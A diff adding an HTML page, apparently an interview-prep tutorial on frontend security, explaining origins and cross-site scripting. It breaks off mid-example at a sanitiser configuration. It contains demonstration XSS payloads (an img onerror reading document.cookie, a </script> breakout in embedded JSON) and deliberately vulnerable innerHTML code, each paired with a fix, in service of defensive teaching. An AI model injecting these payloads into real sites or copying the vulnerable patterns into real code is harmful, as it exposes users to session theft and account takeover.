@@ -1,0 +1,2039 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Frontend Security: XSS, CORS, CSRF &amp; Cookies</title>
+<style>
+  :root {
+    --bg: #fbfaf8;
+    --surface: #ffffff;
+    --text: #232129;
+    --muted: #5c5867;
+    --line: #e4e0da;
+    --accent: #6b46c1;
+    --accent-soft: #f2edfd;
+    --red: #b3243b;
+    --red-soft: #fdeef0;
+    --green: #14713d;
+    --green-soft: #eaf7ef;
+    --amber: #8a5a00;
+    --amber-soft: #fdf4e0;
+    --blue: #1a5f9e;
+    --blue-soft: #eaf2fa;
+    --code-bg: #262336;
+    --code-text: #eae6f5;
+    --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+  }
+
+  * { box-sizing: border-box; }
+
+  html { -webkit-text-size-adjust: 100%; }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17.5px;
+    line-height: 1.72;
+  }
+
+  .wrap {
+    max-width: 750px;
+    margin: 0 auto;
+    padding: 0 22px 120px;
+  }
+
+  header.hero {
+    padding: 72px 0 36px;
+    border-bottom: 1px solid var(--line);
+    margin-bottom: 40px;
+  }
+
+  header.hero .kicker {
+    font-size: 0.78rem;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-weight: 700;
+    margin: 0 0 14px;
+  }
+
+  h1 {
+    font-size: clamp(2rem, 5.5vw, 2.9rem);
+    line-height: 1.15;
+    letter-spacing: -0.022em;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+
+  header.hero p.lede {
+    font-size: 1.12rem;
+    color: var(--muted);
+    margin: 0;
+  }
+
+  h2 {
+    font-size: 1.72rem;
+    line-height: 1.25;
+    letter-spacing: -0.017em;
+    margin: 72px 0 6px;
+    padding-top: 26px;
+    border-top: 3px solid var(--text);
+    font-weight: 800;
+  }
+
+  h2 .num {
+    display: block;
+    font-size: 0.72rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+
+  h3 {
+    font-size: 1.24rem;
+    letter-spacing: -0.01em;
+    margin: 46px 0 10px;
+    font-weight: 700;
+  }
+
+  h4 {
+    font-size: 1.02rem;
+    margin: 32px 0 6px;
+    font-weight: 700;
+    color: var(--muted);
+  }
+
+  p { margin: 0 0 20px; }
+
+  a { color: var(--accent); }
+
+  strong { font-weight: 700; }
+
+  ul, ol { margin: 0 0 22px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+
+  code {
+    font-family: var(--mono);
+    font-size: 0.88em;
+    background: #efecf6;
+    color: #3d2a68;
+    padding: 0.13em 0.36em;
+    border-radius: 4px;
+    word-break: break-word;
+  }
+
+  pre {
+    background: var(--code-bg);
+    color: var(--code-text);
+    padding: 17px 19px;
+    border-radius: 0 0 9px 9px;
+    overflow-x: auto;
+    margin: 0 0 24px;
+    font-size: 0.86rem;
+    line-height: 1.62;
+  }
+
+  pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    font-size: 1em;
+    white-space: pre;
+    word-break: normal;
+  }
+
+  pre.solo { border-radius: 9px; margin-top: 24px; }
+
+  .label {
+    font-family: var(--mono);
+    font-size: 0.76rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    padding: 7px 14px;
+    border-radius: 9px 9px 0 0;
+    margin-top: 24px;
+  }
+  .label.bad  { background: var(--red-soft);   color: var(--red);   border: 1px solid #f3ccd3; border-bottom: none; }
+  .label.good { background: var(--green-soft); color: var(--green); border: 1px solid #c8e6d4; border-bottom: none; }
+  .label.neutral { background: #ecebef; color: var(--muted); border: 1px solid var(--line); border-bottom: none; }
+
+  .callout {
+    border-radius: 10px;
+    padding: 20px 22px 4px;
+    margin: 30px 0;
+    border: 1px solid;
+    font-size: 0.97rem;
+  }
+  .callout .ctitle {
+    font-weight: 800;
+    font-size: 0.82rem;
+    letter-spacing: 0.07em;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    display: block;
+  }
+  .callout p:last-child { margin-bottom: 18px; }
+
+  .wait  { background: var(--blue-soft);  border-color: #c6dcf0; }
+  .wait .ctitle { color: var(--blue); }
+
+  .myth  { background: var(--red-soft);   border-color: #f3ccd3; }
+  .myth .ctitle { color: var(--red); }
+
+  .hood  { background: #f1eff5;           border-color: #ddd8e6; }
+  .hood .ctitle { color: #5a4b78; }
+
+  .note  { background: var(--amber-soft); border-color: #f0dfb5; }
+  .note .ctitle { color: var(--amber); }
+
+  .interview {
+    background: var(--accent-soft);
+    border: 1px solid #ddd0f7;
+    border-left: 5px solid var(--accent);
+    border-radius: 10px;
+    padding: 22px 24px 6px;
+    margin: 34px 0;
+  }
+  .interview .ctitle {
+    font-weight: 800;
+    font-size: 0.82rem;
+    letter-spacing: 0.07em;
+    text-transform: uppercase;
+    color: var(--accent);
+    display: block;
+    margin-bottom: 12px;
+  }
+  .interview h4 { color: #4b3384; margin-top: 26px; }
+  .interview p:last-child { margin-bottom: 20px; }
+
+  .say {
+    background: var(--surface);
+    border: 1px dashed #c4aef0;
+    border-radius: 8px;
+    padding: 16px 18px;
+    margin: 0 0 20px;
+    font-size: 1rem;
+  }
+  .say .tag {
+    display: block;
+    font-family: var(--mono);
+    font-size: 0.71rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+  .say p { margin: 0 0 12px; }
+  .say p:last-child { margin-bottom: 0; }
+
+  details {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin: 0 0 16px;
+  }
+  details summary {
+    cursor: pointer;
+    font-weight: 650;
+    list-style: revert;
+  }
+  details[open] summary { margin-bottom: 12px; }
+  details > *:last-child { margin-bottom: 0; }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 22px 26px;
+    margin: 0 0 44px;
+    font-size: 0.95rem;
+  }
+  .toc strong {
+    display: block;
+    font-size: 0.78rem;
+    letter-spacing: 0.11em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 12px;
+  }
+  .toc ol { margin: 0; padding-left: 20px; }
+  .toc li { margin-bottom: 5px; }
+  .toc a { text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 0 0 26px;
+    font-size: 0.9rem;
+  }
+  th, td {
+    text-align: left;
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: top;
+  }
+  th {
+    background: #f2f0ec;
+    font-size: 0.78rem;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+  td code { font-size: 0.84em; }
+
+  .scroller { overflow-x: auto; margin-bottom: 26px; }
+  .scroller table { margin-bottom: 0; }
+
+  figure {
+    margin: 30px 0;
+    padding: 0;
+  }
+  figure svg { display: block; width: 100%; height: auto; }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 10px;
+  }
+
+  .cheat {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 6px 22px;
+    margin-bottom: 30px;
+  }
+  .cheat dl { margin: 0; }
+  .cheat dt {
+    font-weight: 750;
+    margin-top: 18px;
+    font-size: 0.98rem;
+  }
+  .cheat dd {
+    margin: 4px 0 16px;
+    color: var(--muted);
+    font-size: 0.95rem;
+  }
+
+  hr.soft {
+    border: none;
+    border-top: 1px solid var(--line);
+    margin: 44px 0;
+  }
+
+  .trap {
+    border-left: 4px solid var(--red);
+    padding-left: 18px;
+    margin: 0 0 26px;
+  }
+  .trap .t { font-weight: 700; color: var(--red); }
+
+  @media (max-width: 560px) {
+    body { font-size: 16.5px; }
+    .wrap { padding: 0 16px 80px; }
+    pre { font-size: 0.79rem; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <p class="kicker">Frontend Interview Prep · Guide 26</p>
+  <h1>Frontend Security: XSS, CORS, CSRF &amp; Cookies</h1>
+  <p class="lede">Four letters, three letters, four letters. They sound similar, they get mixed up constantly, and interviewers know it. By the end of this you'll be able to explain each one from first principles — and, more importantly, explain why they're <em>different problems</em>.</p>
+</header>
+
+<p>I want to start with a confession: for the first two years I wrote frontend code, I thought CORS was a security feature that protected my API. I thought it was there to stop other people from calling my endpoints. I would have said that out loud in an interview with total confidence.</p>
+
+<p>It's almost exactly backwards. CORS is a mechanism for <em>loosening</em> a restriction, the restriction protects <em>users</em> and not servers, and a determined attacker with a script and a terminal ignores the whole thing in about four seconds.</p>
+
+<p>That misconception is so common that "explain CORS" has become a filter question. It separates people who memorised a Stack Overflow answer from people who understand what a browser actually is. Same with XSS, same with CSRF. These topics are where interviewers go to test whether you have a <strong>mental model of the browser as a security boundary</strong>, or whether you just know which header to paste to make the red error go away.</p>
+
+<p>So we're going to build that model. Slowly, from the bottom. There's a lot here, and I'm not going to pretend otherwise — this is one of the longer guides. But every section only uses ideas from the sections before it, so if you read straight through, nothing should ever feel like it came out of nowhere.</p>
+
+<p>One quick framing note, because it matters: this is <strong>defensive</strong> material. I'll explain how attacks work, because you cannot defend against a mechanism you don't understand, but the goal throughout is the fix. Every attack section ends with "and here's how you make this impossible."</p>
+
+<div class="toc">
+  <strong>What's in here</strong>
+  <ol>
+    <li><a href="#foundation">The foundation: what a browser trusts, and why</a></li>
+    <li><a href="#xss">XSS — when your data becomes their code</a></li>
+    <li><a href="#xss-react">XSS in React specifically</a></li>
+    <li><a href="#sop">The Same-Origin Policy (read this before CORS)</a></li>
+    <li><a href="#cors">CORS — the server's permission slip</a></li>
+    <li><a href="#csrf">CSRF — riding someone else's session</a></li>
+    <li><a href="#csp">Content Security Policy</a></li>
+    <li><a href="#caching">HTTP caching headers (and the security angle)</a></li>
+    <li><a href="#cookies">Cookie attributes, one at a time</a></li>
+    <li><a href="#storage">Where do I put the auth token?</a></li>
+    <li><a href="#tls">HTTPS/TLS and why the frontend cares</a></li>
+    <li><a href="#sri">Subresource Integrity</a></li>
+    <li><a href="#clickjacking">Clickjacking</a></li>
+    <li><a href="#supplychain">The supply chain problem</a></li>
+    <li><a href="#cheatsheet">Interview cheat sheet</a></li>
+  </ol>
+</div>
+
+<h2 id="foundation"><span class="num">Part 1</span>The foundation: what a browser trusts, and why</h2>
+
+<p>Before any of the acronyms, we need one idea, and it's the idea everything else hangs off.</p>
+
+<p>Your browser, right now, is probably logged into your bank, your email, your GitHub, and a dozen other things. It's holding the keys to all of them <em>at the same time</em>. And it's simultaneously running code — JavaScript — downloaded from whatever random sites you have open. Some of that code was written by people you've never met.</p>
+
+<p>Think about how insane that is. It's as if you handed your house keys, car keys, and safe combination to a stranger, and the only thing keeping you safe is a very carefully written rulebook about which stranger is allowed to touch which key.</p>
+
+<p>That rulebook is browser security. And the fundamental unit in it — the thing the rulebook is written in terms of — is the <strong>origin</strong>.</p>
+
+<h3>What an origin is</h3>
+
+<p>An origin is three things glued together:</p>
+
+<pre class="solo"><code>  https  ://  app.example.com  :  443
+  ─────       ───────────────     ───
+  scheme         host            port</code></pre>
+
+<p>Scheme (the protocol — <code>https</code> or <code>http</code>), host (the full domain name), and port. All three. If any one of them differs, it's a <strong>different origin</strong>, and the browser treats it like a different company.</p>
+
+<p>This trips people up because it doesn't match how humans think about "the same site." Let's do it concretely. Given a page loaded from <code>https://app.example.com/dashboard</code>:</p>
+
+<div class="scroller">
+<table>
+  <thead><tr><th>URL</th><th>Same origin?</th><th>Why</th></tr></thead>
+  <tbody>
+    <tr><td><code>https://app.example.com/settings</code></td><td>✅ Yes</td><td>Path doesn't matter at all</td></tr>
+    <tr><td><code>https://app.example.com/api?q=1</code></td><td>✅ Yes</td><td>Query string doesn't matter either</td></tr>
+    <tr><td><code>http://app.example.com/dashboard</code></td><td>❌ No</td><td>Different scheme (http vs https)</td></tr>
+    <tr><td><code>https://api.example.com/users</code></td><td>❌ No</td><td>Different host — subdomains count!</td></tr>
+    <tr><td><code>https://example.com/</code></td><td>❌ No</td><td>Also a different host</td></tr>
+    <tr><td><code>https://app.example.com:8443/</code></td><td>❌ No</td><td>Different port</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>Two rows there are the ones that bite people. <strong>Subdomains are different origins.</strong> <code>app.example.com</code> and <code>api.example.com</code> are as foreign to each other as <code>google.com</code> and <code>evil.biz</code>, as far as the origin rules are concerned. And <strong>the path is irrelevant</strong> — origin stops at the port.</p>
+
+<div class="callout wait">
+  <span class="ctitle">Wait, what about "site"?</span>
+  <p>You'll also see the word <strong>site</strong> in specs, and it means something looser: roughly the registrable domain (<code>example.com</code>) plus scheme, ignoring subdomains and ports. So <code>app.example.com</code> and <code>api.example.com</code> are <em>different origins</em> but the <em>same site</em>.</p>
+  <p>Why do you care? Because cookies and <code>SameSite</code> — which we'll get to — work at the <em>site</em> level, not the origin level. That mismatch is the source of a surprising number of bugs. Park it for now; I'll flag it again when it matters.</p>
+</div>
+
+<h3>The two questions every security topic answers</h3>
+
+<p>Here's the frame I wish someone had given me on day one. Every topic in this guide is an answer to one of two questions:</p>
+
+<ol>
+  <li><strong>"Whose code is running in my page?"</strong> — If an attacker can get <em>their</em> JavaScript executing inside <em>your</em> origin, they inherit everything your page can do. That's XSS. CSP, sanitisation, and Subresource Integrity are all defences here.</li>
+  <li><strong>"Who is this request really from, and who's allowed to read the answer?"</strong> — Requests fly between origins constantly. The Same-Origin Policy, CORS, CSRF, and cookie attributes are all about identifying and constraining those.</li>
+</ol>
+
+<p>If you can sort a question into bucket 1 or bucket 2 in an interview, you're already ahead of most candidates. XSS is bucket 1. CORS and CSRF are bucket 2. They're not variants of each other; they're different halves of the problem.</p>
+
+<p>Right. Let's start with bucket 1, because it's the one that ruins your whole day.</p>
+
+<h2 id="xss"><span class="num">Part 2</span>XSS — when your data becomes their code</h2>
+
+<p>Let's start with something small and boring. You're building a comment section. Someone leaves a comment, you store it, you render it:</p>
+
+<div class="label neutral">comments.js — looks fine, right?</div>
+<pre><code>const box = document.querySelector('#comments');
+
+box.innerHTML = comments
+  .map(c =&gt; `&lt;p&gt;&lt;b&gt;${c.author}&lt;/b&gt;: ${c.body}&lt;/p&gt;`)
+  .join('');</code></pre>
+
+<p>This is completely normal-looking code. I have written this exact thing. You probably have too.</p>
+
+<p>Now: what happens if someone submits a comment whose body is this?</p>
+
+<pre class="solo"><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></pre>
+
+<p>Take a second with it. That string gets stored in your database. Then it gets glued into a template string. Then that string gets handed to <code>innerHTML</code>.</p>
+
+<p>And <code>innerHTML</code> doesn't "display text." It <strong>parses HTML</strong>. So the browser reads that string, finds an <code>&lt;img&gt;</code> tag, tries to load an image from the URL <code>x</code>, fails (obviously), and fires the <code>onerror</code> handler. Which is JavaScript. Which now runs.</p>
+
+<p>Not in the attacker's page. In <em>yours</em>. On <em>your</em> origin. In the browser of <em>every single person who views that comment</em>.</p>
+
+<p>That's cross-site scripting. And I want to be really precise about why it's so bad, because "an attacker can run JavaScript" undersells it enormously.</p>
+
+<h3>Why running code in your origin is total compromise</h3>
+
+<p>Remember the origin idea. The browser's entire permission system is keyed on origin. Code running on <code>https://yourbank.com</code> is trusted to do everything a page on <code>https://yourbank.com</code> can do, because — normally — that code came from yourbank.com.</p>
+
+<p>So injected script inherits, immediately and without asking:</p>
+
+<ul>
+  <li><strong>The DOM.</strong> It can read every field on the page, including the ones the user just typed. It can rewrite the page — swap the "transfer to" account number, add a fake login form.</li>
+  <li><strong>Cookies</strong> (unless they're <code>HttpOnly</code> — we'll get there, it's the single most important mitigation).</li>
+  <li><strong>localStorage and sessionStorage.</strong> Entirely. Which is why "just put the JWT in localStorage" is a conversation we're going to have.</li>
+  <li><strong>The ability to make authenticated requests.</strong> This is the killer. The script can call <code>fetch('/api/transfer', {...})</code> and the browser will attach the session cookie automatically, because the request genuinely <em>is</em> coming from your origin. Same-origin. No CORS involved. It looks, to your server, exactly like the real user clicking a button.</li>
+</ul>
+
+<p>Notice that last one carefully: XSS lets an attacker <em>act as the user</em>, not just steal a token. That distinction comes back later and it's the answer to a very common follow-up question.</p>
+
+<div class="callout myth">
+  <span class="ctitle">A common misconception</span>
+  <p>"XSS is just about popping an <code>alert()</code>." The alert is how you <em>demonstrate</em> it in a proof of concept, the way you'd tap a wall to show it's hollow. The actual payloads silently exfiltrate session data, keylog the login form, rewrite payment details, or quietly perform actions as the user. An XSS on a page that handles money or credentials is, for practical purposes, full account takeover.</p>
+</div>
+
+<h3>The three flavours</h3>
+
+<p>XSS is always the same core bug — <em>data got treated as code</em> — but it comes in three delivery mechanisms, and interviewers love asking you to name them. What actually distinguishes them is <strong>where the malicious string lives before it reaches the victim</strong>.</p>
+
+<figure>
+<svg viewBox="0 0 700 300" role="img" aria-label="Diagram comparing stored, reflected, and DOM-based XSS paths">
+  <defs>
+    <marker id="arw" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+      <path d="M0,0 L7,3.2 L0,6.4 z" fill="#5c5867"/>
+    </marker>
+  </defs>
+  <g font-family="ui-monospace, monospace" font-size="12" fill="#232129">
+
+    <!-- Stored -->
+    <text x="0" y="16" font-size="13" font-weight="700" fill="#b3243b">STORED — the worst one</text>
+    <rect x="0" y="28" width="120" height="38" rx="6" fill="#fdeef0" stroke="#e29aa8"/>
+    <text x="60" y="52" text-anchor="middle" font-size="11">attacker posts</text>
+    <line x1="122" y1="47" x2="182" y2="47" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="188" y="28" width="120" height="38" rx="6" fill="#ecebef" stroke="#c9c4d1"/>
+    <text x="248" y="46" text-anchor="middle" font-size="11">your database</text>
+    <text x="248" y="59" text-anchor="middle" font-size="10" fill="#5c5867">(sits there)</text>
+    <line x1="310" y1="47" x2="370" y2="47" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="376" y="28" width="150" height="38" rx="6" fill="#fdeef0" stroke="#e29aa8"/>
+    <text x="451" y="52" text-anchor="middle" font-size="11">served to EVERY viewer</text>
+    <text x="540" y="52" font-size="11" fill="#b3243b">no lure needed</text>
+
+    <!-- Reflected -->
+    <text x="0" y="116" font-size="13" font-weight="700" fill="#8a5a00">REFLECTED — needs a lure</text>
+    <rect x="0" y="128" width="120" height="38" rx="6" fill="#fdf4e0" stroke="#dbbd80"/>
+    <text x="60" y="145" text-anchor="middle" font-size="11">crafted link</text>
+    <text x="60" y="158" text-anchor="middle" font-size="10" fill="#5c5867">?q=&lt;script&gt;</text>
+    <line x1="122" y1="147" x2="182" y2="147" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="188" y="128" width="120" height="38" rx="6" fill="#ecebef" stroke="#c9c4d1"/>
+    <text x="248" y="146" text-anchor="middle" font-size="11">server echoes it</text>
+    <text x="248" y="159" text-anchor="middle" font-size="10" fill="#5c5867">into the HTML</text>
+    <line x1="310" y1="147" x2="370" y2="147" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="376" y="128" width="150" height="38" rx="6" fill="#fdf4e0" stroke="#dbbd80"/>
+    <text x="451" y="152" text-anchor="middle" font-size="11">one victim who clicked</text>
+
+    <!-- DOM -->
+    <text x="0" y="216" font-size="13" font-weight="700" fill="#1a5f9e">DOM-BASED — server never sees it</text>
+    <rect x="0" y="228" width="120" height="38" rx="6" fill="#eaf2fa" stroke="#9dc0e0"/>
+    <text x="60" y="245" text-anchor="middle" font-size="11">URL #fragment</text>
+    <text x="60" y="258" text-anchor="middle" font-size="10" fill="#5c5867">(never sent!)</text>
+    <line x1="122" y1="247" x2="182" y2="247" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="188" y="228" width="120" height="38" rx="6" fill="#eaf2fa" stroke="#9dc0e0"/>
+    <text x="248" y="246" text-anchor="middle" font-size="11">your own JS</text>
+    <text x="248" y="259" text-anchor="middle" font-size="10" fill="#5c5867">reads location</text>
+    <line x1="310" y1="247" x2="370" y2="247" stroke="#5c5867" stroke-width="1.5" marker-end="url(#arw)"/>
+    <rect x="376" y="228" width="150" height="38" rx="6" fill="#fdeef0" stroke="#e29aa8"/>
+    <text x="451" y="252" text-anchor="middle" font-size="11">innerHTML = ☠️</text>
+    <text x="540" y="240" font-size="11" fill="#1a5f9e">server logs show</text>
+    <text x="540" y="256" font-size="11" fill="#1a5f9e">nothing at all</text>
+  </g>
+</svg>
+<figcaption>The same bug, three delivery routes. What differs is where the payload lives in between.</figcaption>
+</figure>
+
+<h4>Stored XSS (a.k.a. persistent)</h4>
+
+<p>The payload gets saved on the server — in the comments table, the username field, the "about me" bio, a product review, a support ticket. Then it's served to everybody who loads that page.</p>
+
+<p>This is the worst kind by a distance, because the attacker doesn't need to trick anyone into clicking anything. They plant it once and it hits every visitor. Stored XSS in a username field is how you get a self-propagating worm — the classic being the MySpace "Samy" worm in 2005, which added a million friends in under a day by putting a payload in a profile that added the payload to <em>your</em> profile when you viewed it.</p>
+
+<h4>Reflected XSS</h4>
+
+<p>The payload is in the request — usually a query parameter — and the server echoes it straight back into the response HTML. Think of a search page that renders <code>You searched for: &lt;the query&gt;</code>.</p>
+
+<pre class="solo"><code>https://shop.example.com/search?q=&lt;script&gt;…&lt;/script&gt;
+                                  ▲
+        server pastes this into the page unescaped</code></pre>
+
+<p>Nothing is stored. The payload only exists in that one URL, so the attacker needs a <strong>lure</strong>: a phishing email, a shortened link, a malicious ad. That's a real extra hurdle, which is why reflected ranks below stored — but "needs a click" has never been much of a defence in practice.</p>
+
+<h4>DOM-based XSS</h4>
+
+<p>This one is the sneakiest, and it's the one that's grown as apps became more client-heavy. The payload <strong>never touches your server at all</strong>. The vulnerability lives entirely in your JavaScript.</p>
+
+<div class="label bad">❌ Buggy — a real pattern I've seen shipped</div>
+<pre><code>// "Nice" welcome banner: /page#name=Sam  →  "Welcome, Sam!"
+const name = decodeURIComponent(location.hash.slice(6));
+
+document.querySelector('#banner').innerHTML = `Welcome, ${name}!`;
+//                                  👆 sink        👆 source</code></pre>
+
+<p>Two words worth learning because they make this whole class of bug easy to talk about:</p>
+
+<ul>
+  <li>A <strong>source</strong> is anywhere attacker-controllable data enters your JS: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code> data, a value read back out of <code>localStorage</code>, an API response containing another user's content.</li>
+  <li>A <strong>sink</strong> is anywhere data gets interpreted as code or markup: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>insertAdjacentHTML</code>, <code>eval</code>, <code>new Function</code>, <code>setTimeout</code> with a string argument, assigning to <code>element.src</code> or <code>href</code>, jQuery's <code>$(...)</code> with an HTML string.</li>
+</ul>
+
+<p><strong>DOM XSS is a source flowing into a sink without a scrub in between.</strong> That's the whole thing. When you audit a codebase, you're basically grepping for sinks and tracing backwards.</p>
+
+<p>And notice the extra nastiness in that example: the payload is after a <code>#</code>. <strong>The fragment is never transmitted to the server.</strong> Your server logs, your WAF, your backend security scanner — none of them will ever see the attack. Only the browser does.</p>
+
+<div class="callout hood">
+  <span class="ctitle">Under the hood — why <code>&lt;script&gt;</code> tags in innerHTML don't fire</span>
+  <p>If you experiment, you'll notice <code>el.innerHTML = '&lt;script&gt;alert(1)&lt;/script&gt;'</code> doesn't actually run. The HTML spec says script elements inserted via innerHTML are parsed but not executed.</p>
+  <p>People occasionally use this to argue innerHTML is safe. It absolutely is not — it's why every real payload uses an event handler instead (<code>&lt;img src=x onerror=…&gt;</code>, <code>&lt;svg onload=…&gt;</code>, <code>&lt;body onpageshow=…&gt;</code>). There are dozens of these. Blocking the string "script" blocks nothing.</p>
+</div>
+
+<h3>Fixing it, in priority order</h3>
+
+<p>Here's the thing about XSS defences: people reach for the exciting ones (sanitiser libraries, CSP) and skip the boring one that actually solves 95% of cases. Let's do them in the order you should actually apply them.</p>
+
+<h4>1. Contextual output encoding — the real fix</h4>
+
+<p>The bug is that a character with special meaning in HTML (<code>&lt;</code>) got interpreted as special. So: when you insert untrusted data into a document, convert those characters into their harmless entity forms. <code>&lt;</code> becomes <code>&amp;lt;</code>, <code>&gt;</code> becomes <code>&amp;gt;</code>, <code>&amp;</code> becomes <code>&amp;amp;</code>, quotes become <code>&amp;quot;</code> and <code>&amp;#39;</code>.</p>
+
+<p>Now <code>&lt;img src=x onerror=…&gt;</code> renders as the literal, inert text "&lt;img src=x onerror=…&gt;" on the page. Which, honestly, is what the user asked for.</p>
+
+<p>But — and this is the part that gets skipped — <strong>"encoding" isn't one operation. It depends on where the data lands.</strong> HTML has several sub-languages inside it, each with different special characters.</p>
+
+<div class="scroller">
+<table>
+  <thead><tr><th>Context</th><th>Example</th><th>What breaks out of it</th></tr></thead>
+  <tbody>
+    <tr><td>HTML body text</td><td><code>&lt;p&gt;DATA&lt;/p&gt;</code></td><td><code>&lt;</code> and <code>&amp;</code> — escape to entities</td></tr>
+    <tr><td>Attribute value</td><td><code>&lt;div title="DATA"&gt;</code></td><td>The quote character. <em>Unquoted</em> attributes are far worse — a space is enough to add <code>onmouseover=</code></td></tr>
+    <tr><td>URL attribute</td><td><code>&lt;a href="DATA"&gt;</code></td><td>Nothing needs escaping — the <em>scheme</em> is the danger. <code>javascript:</code> and <code>data:</code> execute</td></tr>
+    <tr><td>Inside a <code>&lt;script&gt;</code></td><td><code>var user = "DATA";</code></td><td>Quotes, backslashes, and <code>&lt;/script&gt;</code> — which ends the block <em>even inside a string literal</em></td></tr>
+    <tr><td>Inside CSS</td><td><code>style="width: DATA"</code></td><td><code>expression()</code> in old IE; <code>url()</code> exfiltration; breaking out with <code>}</code></td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>That fourth row is genuinely surprising and worth internalising. The HTML parser looks for the byte sequence <code>&lt;/script</code> without caring at all that it's inside a JS string. So this:</p>
+
+<div class="label bad">❌ Buggy — server-rendering state into a script tag</div>
+<pre><code>&lt;script&gt;
+  window.__STATE__ = {"bio": "&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;"};
+&lt;/script&gt;</code></pre>
+
+<p>…closes the script block early and the rest becomes live HTML. JSON encoding alone doesn't save you, because <code>JSON.stringify</code> has no reason to escape a forward slash.</p>
+
+<div class="label good">✅ Fixed — escape the sequences that matter to the HTML parser</div>
+<pre><code>const safe = JSON.stringify(state)
+  .replace(/&lt;/g, '\\u003c')   // 👈 kills &lt;/script&gt; and &lt;!--
+  .replace(/&gt;/g, '\\u003e')
+  .replace(/&amp;/g, '\\u0026');
+
+// then:  &lt;script&gt;window.__STATE__ = ${safe}&lt;/script&gt;</code></pre>
+
+<p>Those unicode escapes are still valid JSON and parse back to the same string — they just don't look like a tag to the HTML parser. (Most serious SSR frameworks do this for you. Worth knowing that they're doing it, and why.)</p>
+
+<div class="callout wait">
+  <span class="ctitle">Wait — why isn't sanitizing on <em>input</em> enough?</span>
+  <p>Very common instinct: strip dangerous characters when the comment is submitted, then you never have to think about it again. It fails for three reasons, and this is a favourite interview follow-up.</p>
+  <p><strong>One:</strong> at input time you don't know the output context. The same bio string might end up in HTML body text, in a <code>title</code> attribute, in a JSON blob inside a <code>&lt;script&gt;</code>, in a PDF, and in an email. Each needs different escaping. You cannot pick the right one before you know the destination.</p>
+  <p><strong>Two:</strong> it corrupts real data. Someone named <em>O'Brien</em>, a maths comment containing <code>a &lt; b</code>, a C++ question — all mangled forever. Escaping at output keeps the database honest and the display safe.</p>
+  <p><strong>Three:</strong> input filters are a blocklist, and blocklists lose. Data also arrives through paths that skip your filter: a database import, an admin tool, a third-party API, another microservice. Output encoding is the last gate before rendering, so <em>everything</em> passes through it.</p>
+  <p>Validate on input (is this a plausible email? is this under 500 chars?). Encode on output. Different jobs.</p>
+</div>
+
+<h4>2. Stop using innerHTML when you mean text</h4>
+
+<p>Enormous number of XSS bugs die right here:</p>
+
+<div class="label good">✅ Fixed</div>
+<pre><code>el.textContent = comment.body;   // 👈 never parses HTML. Ever.</code></pre>
+
+<p><code>textContent</code> treats the string as text, full stop. If it contains <code>&lt;script&gt;</code>, you'll see the characters <code>&lt;script&gt;</code> on screen. There is no escaping to get wrong because there's no parser involved.</p>
+
+<p>If you need structure, build it with <code>createElement</code> and <code>append</code>, or use a templating system that escapes by default. The rule of thumb I'd give: <strong>if you're about to type <code>.innerHTML =</code>, stop and ask whether every byte of that string came from your own source code.</strong> If any of it came from a user, an API, or a URL, you need a different approach.</p>
+
+<h4>3. If you genuinely must render user HTML, use a real sanitiser</h4>
+
+<p>Sometimes the requirement is real: a rich-text editor, a CMS, markdown with embedded HTML. In that case, you need to parse the HTML, walk the resulting tree, and delete everything not on an allowlist of tags and attributes.</p>
+
+<p>Do not write this yourself. I mean it. Here's why: the "obvious" approach is a regex that strips <code>&lt;script&gt;</code> tags. But attackers have <code>&lt;SCRIPT&gt;</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code> (strip once and it reassembles), null bytes, weird encodings, <code>&lt;svg&gt;</code> namespace confusion, <code>&lt;math&gt;</code> tricks, mutation bugs where the browser re-parses your "clean" output into something dangerous. Professional sanitisers have years of adversarial testing baked in.</p>
+
+<div class="label good">✅ Fixed</div>
+<pre><code>import DOMPurify from 'dompurify';
+
+const clean = DOMPurify.sanitize(post.htmlBody, {
+  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
